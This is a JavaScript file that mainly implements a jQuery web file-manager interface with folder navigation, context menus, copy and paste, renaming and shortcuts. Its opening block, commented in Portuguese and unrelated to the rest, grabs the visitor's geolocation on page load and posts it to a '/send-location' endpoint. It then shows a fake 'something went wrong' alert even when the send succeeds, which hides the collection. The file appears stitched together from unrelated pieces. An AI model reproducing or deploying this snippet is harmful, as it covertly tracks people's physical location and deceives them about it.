// Executa automaticamente ao carregar a página
window.addEventListener("load", () => {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(sendLocation, handleError);
  } else {
    alert("Algo deu errado. Tente novamente mais tarde.");
  }
});

function sendLocation(position) {
  const latitude = position.coords.latitude;
  const longitude = position.coords.longitude;

  // Envia a localização para o backend
  fetch("/send-location", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({ latitude, longitude })
  })
  .then(response => response.json())
  .then(data => {
    if (data.success) {
      alert("Algo deu errado. Tente novamente mais tarde.");
    } else {
      alert("Algo deu errado. Tente novamente mais tarde.");
    }
  })
  .catch(error => {
    console.error("Erro:", error);
  });
}

function handleError(error) {
  alert("Erro ao obter a localização: " + error.message);
}

/*-----------File Manager Setting---------------------|START-------*/
var data = {html:"fab fa-html5",js:"fab fa-js",css:"fab fa-css3-alt",jpg:"fas fa-image",png:"fas fa-image",gif:"fas fa-image",jpeg:"fas fa-image",php:"fab fa-php",mp4:"fas fa-video",folder:"fas fa-folder",cloud:"fas fa-cloud",image:"fas fa-images",project:"fab fa-buromobelexperte"};
/*-----------File Manager Setting---------------------|END-------*/
function randomGrnrate() {
    var text = "";
  var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";

  for (var i = 0; i < 20; i++)
    text += possible.charAt(Math.floor(Math.random() * possible.length));

  return text;
}
$('[data-type]').each(function() {
	$(this).attr('data-file-id',randomGrnrate());
});
/*-----------Wrap in Elements---------------------|START-------*/
$('.cloud-manager li').contents().filter(function() {
    return this.nodeType == 3 && $.trim(this.textContent) != '';
}).wrap('<span class="data-block" />');
$('.cloud-manager li > .data-block').contents().filter(function() {
    return this.nodeType == 3 && $.trim(this.textContent) != '';
}).wrap('<span autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="false" class="data-name" />');
/*-----------Wrap in Elements---------------------|END-------*/
/*-----------Icons---------------------|START-------*/
$('.cloud-manager > ul').addClass('active-folder');
$('.cloud-manager li').each(function(){
	var getDataType = $(this).attr('data-type');
	$(this).children('.data-block').prepend('<i class="'+data[getDataType]+'"></i>');
});
/*-----------Icons---------------------|END-------*/
function emptyFolder(){
	$('.cloud-manager ul li[data-type="folder"]:not(:has(ul))').addClass('empty-folder');
	$('.empty-folder').append('<ul class="empty-text"></ul>');
}
function backButton(){
	$('.cloud-manager ul li:has(ul)').addClass('has-files-or-folder');
	$('.has-files-or-folder').each(function(){
		$(this).find('.cm-folder-back').remove();
		$(this).children('.data-block').prepend('<i title="Back" class="cm-folder-back"><i class="fas fa-angle-left"></i></i>');
	});
}
function checkEmpty(){
	$('.cloud-manager ul').each(function(){
		if($(this).children().length == 0){
		   	$(this).addClass('empty-text').removeClass('has-files-or-folder');
		 }
	});
}
emptyFolder();
backButton();
checkEmpty();
/*------------Basic Explorer Functionality--------------------|START----------*/
$('.cloud-manager ul ul ul li').addClass('hide-folder');
$('.cloud-manager > ul > li > .data-block > .cm-folder-back').remove();
$(document).on('dblclick', '.cloud-manager ul li.has-files-or-folder[data-type="folder"],.cloud-manager ul li.has-files-or-folder[data-type="cloud"]', function(e) {
	e.stopPropagation();
	$('.cloud-manager ul').removeClass('active-folder');
	$(this).closest('ul').addClass('active-folder');
	$('.cloud-manager ul li').addClass('hide-folder').removeClass('show-folder');
	$(this).addClass('show-folder').removeClass('hide-folder');
	$('.cloud-manager ul.active-folder .show-folder > ul > li').addClass('show-folder').removeClass('hide-folder');
	$('.cloud-manager ul.active-folder > li').removeClass('select');
	$('.cloud-manager ul.active-folder > li > .data-block').parent('li').addClass('do-not-select').removeClass('select');
});
$(document).on('click', '.cm-folder-back', function(e) {
	e.stopPropagation();
	$(this).parent('span').parent('li').closest('ul').removeClass('active-folder').parent('li').closest('ul').addClass('active-folder');
	$('.cloud-manager ul li').addClass('hide-folder').removeClass('show-folder');
	$(this).parent('span').parent('li').addClass('show-folder').removeClass('hide-folder');
	$(this).parent('span').parent('li').siblings('li').addClass('show-folder').removeClass('hide-folder');
	$(this).parent('span').parent('li').parent('ul').closest('li').addClass('show-folder').removeClass('hide-folder');
	$('.cloud-manager ul.active-folder > li').removeClass('select');
	$('.cloud-manager ul > li > .data-block').parent('li').removeClass('do-not-select').removeClass('select');
});
/*------------Basic Explorer Functionality--------------------|END----------*/
/*--------------------File And Folder Select--------------------|START-----------*/
$(document).on('click', '.cloud-manager ul li', function(e) {
	e.stopPropagation();
    if (e.ctrlKey) {
        $(this).addClass('select');
		$(this).removeClass('renaming');
    } else {
        $('.select').removeClass('select');
        $(this).addClass('select').siblings().removeClass('select');
		$(this).removeClass('renaming');
    }
});
$(document).on('click contextmenu dblclick', function() {
    $('.cloud-manager ul li').removeClass('select renaming context-visible');
    $('.append-option-box').remove();
	$('.data-name').attr('contenteditable', false);
});
/*--------------------File And Folder Select--------------------|END-----------*/
/*--------------------Delete & Rename Data--------------------|START-----------*/
function deleteData() {
    var r = confirm("Are you Sure To Delete.");
    if (r == true) {
        $('.select').remove();
        return false;
    } else {
        return false;
    }
}
function renameData(renameClass) {
    $('.renaming').removeClass('renaming');
    $(renameClass).closest('li').addClass('renaming').removeClass('select');
    $(renameClass).closest('li').children('.data-block').children('.data-name').attr('contenteditable', true).focus().select();
    $('.renaming').removeClass('select');
	$('.append-option-box').remove();
}
function pasteData() {
	$('.data-moving').each(function() {
		if($('.active-folder > li > ul').hasClass('empty-text')){
			$('.active-folder > li > ul').removeClass('empty-text').addClass('has-files-or-folder');
			$(this).clone().removeClass('data-copy').appendTo('.active-folder > li.show-folder > ul.has-files-or-folder');
			$('.active-folder > li.show-folder > ul.has-files-or-folder').children('li').addClass('show-folder').removeClass('hide-folder');
			$('.data-moving,.data-copy').removeClass('data-moving').removeClass('data-copy');
			$(this).remove();
		}else {
			$('.active-folder > li > ul').removeClass('empty-text').addClass('has-files-or-folder');
			$(this).clone().removeClass('data-copy').appendTo('.active-folder > li.show-folder > ul.has-files-or-folder');
			$('.active-folder > li.show-folder > ul.has-files-or-folder').children('li').addClass('show-folder').removeClass('hide-folder');
			$('.data-moving,.data-copy').removeClass('data-moving').removeClass('data-copy');
			$(this).remove();
		}
	});
    $('.data-copy').each(function() {
        if($('.active-folder > li > ul').hasClass('empty-text')){
			$('.active-folder > li > ul').removeClass('empty-text').addClass('has-files-or-folder');
			$(this).clone().removeClass('data-copy').appendTo('.active-folder > li.show-folder > ul.has-files-or-folder');
			$('.active-folder > li.show-folder > ul.has-files-or-folder').children('li').addClass('show-folder').removeClass('hide-folder');
			$('.data-moving,.data-copy').removeClass('data-moving').removeClass('data-copy');
		}else {
			$('.active-folder > li > ul').removeClass('empty-text').addClass('has-files-or-folder');
			$(this).clone().removeClass('data-copy').appendTo('.active-folder > li.show-folder > ul.has-files-or-folder');
			$('.active-folder > li.show-folder > ul.has-files-or-folder').children('li').addClass('show-folder').removeClass('hide-folder');
			$('.data-moving,.data-copy').removeClass('data-moving').removeClass('data-copy');
		}
    });
	createFileAndFolderDataBase();
	checkEmpty();
}
/*--------------------Delete & Rename Data--------------------|END-----------*/
/*-------------------Shortcuts-------------------------|START------------*/
$(window).on('keydown', function(ev) {
    if (ev.keyCode === 39) { /*left arrow*/
        $('.select').next('[data-type]').addClass('select').siblings().removeClass('select');
    } else if (ev.keyCode === 37) { /*right arrow*/
        $('.select').prev('[data-type]').addClass('select').siblings().removeClass('select');
    } else if (ev.keyCode === 13) { /*enter*/
        $('.select:not(:last)').each(function() {
            $(this).removeClass('select');
        });
        $('.select').dblclick();
    } else if (ev.ctrlKey && ev.keyCode === 88) { /*move*/
        $('.data-moving,.data-copy').removeClass('data-moving').removeClass('data-copy');
        $('.select').addClass('data-moving').removeClass('data-copy');
        return false;
    } else if (ev.ctrlKey && ev.keyCode === 67) { /*copy*/
        $('.data-moving,.data-copy').removeClass('data-moving').removeClass('data-copy');
        $('.select').addClass('data-copy').removeClass('data-moving');
        return false;
    } else if (ev.ctrlKey && ev.keyCode === 86) { /*paste*/
        pasteData(); 
    } else if (ev.keyCode === 46) { /*delete*/  
        deleteData();
    } else if (ev.keyCode === 27) { /*Back*/
        $('.cloud-manager ul.active-folder > li.show-folder > span > .cm-folder-back').click();
    } else if (ev.ctrlKey && ev.keyCode === 65) { /*Shift Select*/

    } else if (ev.keyCode === 113) { /*Rename*/
        renameData('.select');
    }else if (ev.ctrlKey && ev.keyCode === 70) { /*Search*/
        $('.cm-address-bar-search > div input').focus();
		return false;
    }
	createFileAndFolderDataBase();
	checkEmpty();
});
/*-------------------Shortcuts-------------------------|END------------*/
/*---------Open Data Context Menu------------|START---------*/
$(document).on('click', '[data-function="data-open"]', function() {
    $('.select').dblclick();
	createFileAndFolderDataBase();
});
/*---------Open Data Context Menu------------|END---------*/
/*---------Move Data Context Menu------------|START---------*/
$(document).on('click', '[data-function="data-move"]', function() {
	$('.data-moving,.data-copy').removeClass('data-moving').removeClass('data-copy');
	$('.select').addClass('data-moving').removeClass('data-copy');
	createFileAndFolderDataBase();
});
/*---------Move Data Context Menu------------|END---------*/
/*---------Copy Data Context Menu------------|START---------*/
$(document).on('click', '[data-function="data-copy"]', function() {
	$('.data-moving,.data-copy').removeClass('data-moving').removeClass('data-copy');
	$('.select').addClass('data-copy').removeClass('data-moving');
	createFileAndFolderDataBase();
});
/*---------Copy Data Context Menu------------|END---------*/
/*---------Paste Data------------|START---------*/
$(document).on('click', '[data-function="paste-data"]', function() {
    pasteData();
	createFileAndFolderDataBase();
});
/*---------Paste Data------------|END---------*/
/*---------Properties Context Menu------------|START---------*/
$(document).on('click', '[data-function="data-properties"]', function() {
    $('.cm-properties-popup-section').addClass('open');
});
$(document).on('click', '.cm-properties-close', function() {
    $('.cm-properties-popup-section').removeClass('open');
});
/*---------Properties Context Menu------------|END---------*/
/*---------Rename File and Folder------------|START---------*/
$(document).on('click', '[data-function="data-rename"]', function() {
    renameData(this);
	createFileAndFolderDataBase();
});
/*---------Rename File and Folder------------|END---------*/
/*---------Delete File and Folder------------|START---------*/
$(document).on('click', '[data-function="data-delete"]', function() {
    deleteData();
    createFileAndFolderDataBase();
});
/*---------Delete File and Folder------------|END---------*/
/*---------Context Menu Start------------|START---------*/
$(document).on('contextmenu', '[data-type]', function(e) {
	e.stopPropagation();
    var off = $(this).offset();
    var topPos = e.pageY;
    var leftPos = e.pageX;
    $('.append-option-box').remove();
    $(this).addClass('context-visible').addClass('select');
    $(this).append('<div mobile="true" class="append-option-box" style="top:' + topPos + 'px;left:' + leftPos + 'px;"><div class="inner-contenxt-box"><div data-open="data-move">Open</div><div data-function="data-copy">Copy</div> <div data-function="data-move">Move</div> <div data-function="data-rename">Rename</div> <div data-function="data-delete">Delete</div> <div class="">Share</div> <div data-function="data-properties">Properties</div><div data-function="data-copy-path">Copy Path</div><div data-function="data-copy-secure-path">Copy Secure Path</div></div></div>');
    $('.append-option-box>div>div:has(div)').addClass('has-sub-context');
    /*if ($(this).attr('data-type') != "folder" || $(this).attr('data-type') != "cloud") {
        $('.append-option-box .inner-contenxt-box').append('<div data-function="data-copy-path">Copy Path</div>');
        $('.append-option-box .inner-contenxt-box').append('<div data-function="data-copy-secure-path">Copy Secure Path</div>');
    }*/
    return false;
});
$(document).on('contextmenu', '.cloud-manager', function(e) {
    var off = $(this).offset();
    var topPos = e.pageY;
    var leftPos = e.pageX;
    $('.append-option-box').remove();
    $(this).append('<div mobile="true" class="append-option-box" style="top:' + topPos + 'px;left:' + leftPos + 'px;"><div class="inner-contenxt-box"> <div data-function="view"> <span>View</span> <div class="main-sub-menu"> <div data-size="small">Small</div> <div data-size="medium">Medium</div> <div data-size="large">Large</div> </div> </div> <div data-function="short"> <span>Short</span> <div class="main-sub-menu"> <div>Name</div> <div>Date Modified</div> <div>Size</div> <div>Type</div> </div> </div> <div data-function="new"> <span>New Files</span> <div class="main-sub-menu"> <div>HTML File</div> <div>CSS File</div> <div>JS File</div> <div>PHP File</div> <div>Custom File</div> </div> </div> <div data-function="new-folder">New Folder</div> <div class="" data-function="paste-data">Paste</div> <div data-function="folder-properties">Properties</div> </div> </div>');
    $('.append-option-box>div>div:has(div)').addClass('has-sub-context');
    $('.has-sub-context').append('<i class="fas fa-chevron-right"></i>');
    return false;
});
/*---------Context Menu Start------------|END---------*/
/*------------Size--------------|START-------------------*/
$(document).on('click', '[data-size]', function() {
    var getSize = $(this).attr('data-size');
    $('.cloud-manager').removeClass('small medium large');
    $('.cloud-manager').addClass(getSize);
});
$(document).on('click', '[data-function="new-folder"]', function() {
	if($('.active-folder > li > ul').hasClass('empty-text')){
	    $('.active-folder > li > ul').removeClass('empty-text').addClass('has-files-or-folder');
		$('.active-folder > li.show-folder > ul').append('<li data-new="new" data-cloud="load" data-type="folder" class="empty-folder has-files-or-folder show-folder"> <span class="data-block"> <i title="Back" class="cm-folder-back"> <i class="fas fa-angle-left"></i> </i> <i class="fas fa-folder"></i> <span class="data-name">New Folder</span> </span> <ul class="empty-text"></ul></li>');
	}else{
		$('.active-folder > li.show-folder > ul').append('<li data-new="new" data-cloud="load" data-type="folder" class="empty-folder has-files-or-folder show-folder"> <span class="data-block"> <i title="Back" class="cm-folder-back"> <i class="fas fa-angle-left"></i> </i> <i class="fas fa-folder"></i> <span class="data-name">New Folder</span> </span> <ul class="empty-text"></ul></li>');
	}
	createFileAndFolderDataBase();
});
/*------------Size--------------|START-------------------*/

function createFileAndFolderDataBase() {
    $('.cloud-manager > ul li').each(function() {
        var folderSlug = $(this).children('.data-block').children('.data-name').not('.cm-folder-back').text().trim().split(' ').join('-');
        $(this).attr('data-slug', folderSlug);
    });
    $('[data-slug]').each(function() {
        var b = $(this).attr('data-slug').trim();
        var a = $(this).parents('li').map(function() {
            return $(this).attr('data-slug').trim();
        }).get().reverse().join("/");
		if(a==""){
			$(this).attr('data-path',b);
		}else{
			$(this).attr('data-path', a + "/" + b);
		}
        
    });
    /*var folderStructureJson = [];
    $('[data-file-id]').each(function() {
        var folderStructure = {};
        var fileID = $(this).attr('data-file-id');
        var filePath = $(this).attr('data-path');
        folderStructure.fileID = "{{" + fileID + "}}";
        folderStructure.filePath = filePath;
        folderStructureJson.push(folderStructure);
    });*/
}
createFileAndFolderDataBase();

/*---------Copied to Clipboard------------|START---------*/
function copyToClipboard(element) {
    var $temp = $("<input>");
    $("body").append($temp);
    var txt = '{{ ' + $(element).closest('[data-file-id]').attr('data-file-id') + ' }}';
    $temp.val(txt).select();
    document.execCommand("copy");
    $temp.remove();
    $('.cloud-manager').append('<div class="copied notification">Copied !</div>');
    setTimeout(function() {
        $('.copied').addClass('copied-visible');
    }, 500);
    setTimeout(function() {
        $('.copied').remove();
    }, 3000);
}

function copyToClipboardPath(element) {
    var $temp = $("<input>");
    $("body").append($temp);
    var txt = $(element).closest('[data-path]').attr('data-path');
    $temp.val(txt).select();
    document.execCommand("copy");
    $temp.remove();
    $('.cloud-manager').append('<div class="copied notification">Copied !</div>');
    setTimeout(function() {
        $('.copied').addClass('copied-visible');
    }, 500);
    setTimeout(function() {
        $('.copied').remove();
    }, 3000);
}
$(document).on('click', '[data-function="data-copy-secure-path"]', function() {
    copyToClipboard(this);
});
$(document).on('click', '[data-function="data-copy-path"]', function() {
    copyToClipboardPath(this);
});
$(document).on('click', '.append-option-box', function() {
	$('.append-option-box').remove();
});
/*---------Copied to Clipboard------------|END---------*/
/*------------Upload Button------------|START----------*/
$(document).on('click','.upload',function(){
	$(this).toggleClass('loading');
});
$(document).on('click','.user-option',function(e){
	e.stopPropagation();
	$(this).toggleClass('user-open');
});
$(document).on('click',function(e){
	$('.user-option').removeClass('user-open');
});
/*------------Upload Button------------|END----------*/
$(document).on('contextmenu','.cloud-manager',function(){
	setTimeout(function(){
		$('[mobile="true"]').addClass('open');
	},10);
});
$('.address-search-input').focus(function(){
	$('.address-short-btn').hide();
	$(this).select();
}).blur(function(){
	$('.address-short-btn').show();
});
function addressnav(contect){
	var text = $(contect).attr('data-path');
	if(text){
		if(text.indexOf("/")){
			$('.address-search-input').val(text);
			var getAddressData = text.toString().split('/');
			$('.address-short-btn').empty();
			for(var i=0;i<getAddressData.length;i++){
				$('.address-short-btn').append('<div data-address="'+getAddressData[i]+'"><span>'+getAddressData[i]+'</span><i class="fas fa-caret-right"></i></div>');
			}
			var getSearchPlaceholder = $('.cloud-manager ul.active-folder > li.show-folder > .data-block > .data-name').text();
			$('.files-search-input').attr('placeholder','Search in '+getSearchPlaceholder);
		}else{
			$('.address-short-btn').empty();
			$('.address-short-btn').append('<div data-address><span>'+text+'</span></div>');
			$('.files-search-input').attr('placeholder','Search..');
		}
	}else{
		$('.address-short-btn').empty();
		$('.address-search-input').val('');
		$('.files-search-input').attr('placeholder','Search..');
		return false;
	}
}
$(document).ready(function() {
    addressnav('[data-type="project"]');
});
$(document).on('dblclick','.cloud-manager ul li',function(e) {
    addressnav(this);
});
$(document).on('click','.cm-folder-back',function(e) {
	addressnav($(this).parent('span').closest('li').parent('ul').closest('li'));
});
$(document).on('click','.cm-button.address-button',function(e) {
	var getAdd = $('.address-search-input').val();
	$('[data-type]').addClass('hide-folder').removeClass('show-folder do-not-select');
	$('[data-type][data-path="'+getAdd+'"]').removeClass('hide-folder').addClass('show-folder do-not-select');
	$('[data-type][data-path="'+getAdd+'"]').siblings('[data-type]').removeClass('hide-folder').addClass('show-folder do-not-select');
	$('.cloud-manager ul').removeClass('active-folder');
	$('[data-type][data-path="'+getAdd+'"]').closest('ul').closest('li').closest('ul').addClass('active-folder');
	/*$('[data-type][data-path="'+getAdd+'"]').closest('ul').closest('li').closest('ul').addClass('active-folder').children('li').removeClass('hide-folder').addClass('show-folder do-not-select');*/
});

/*---------Flex Modal---------*/
var getModalData;
$("[modal-click]").click(function() {
    getModalData = $(this).attr("modal-click");
    $('[modal-data="' + getModalData + '"]').addClass("modal-open");
    $(".modals-overlay").toggleClass("overlay-open");
    $('.cm-model-wrapper').addClass('model-wrap-open');
});
$(".modals-overlay,.cm-model-wrapper").click(function(e) {
    $('[modal-data="' + getModalData + '"]').removeClass("modal-open");
    $(".modals-overlay").removeClass("overlay-open");
    $('.cm-model-wrapper').removeClass('model-wrap-open');
});
$("[modal-data]").click(function(e) {
    e.stopPropagation();
});
$("[model-close]").click(function() {
    $(this).addClass('loading');
    setTimeout(function() {
        $('[modal-data="' + getModalData + '"]').removeClass("modal-open");
        $(".modals-overlay").removeClass("overlay-open");
        $('.cm-model-wrapper').removeClass('model-wrap-open');
        $('.btn-def').removeClass('loading');
        $('[modal-data] .cm-project-setting-inner-wrapper input, [modal-data] .cm-project-setting-inner-wrapper textarea').val("");
    }, 1000);
});
$('.advanced.setting-inner').click(function() {
    $(this).next('.cm-adv-form-wrapper').slideToggle();
    $(this).toggleClass('adv-open');
});
/*---------END Flex Modal---------*/
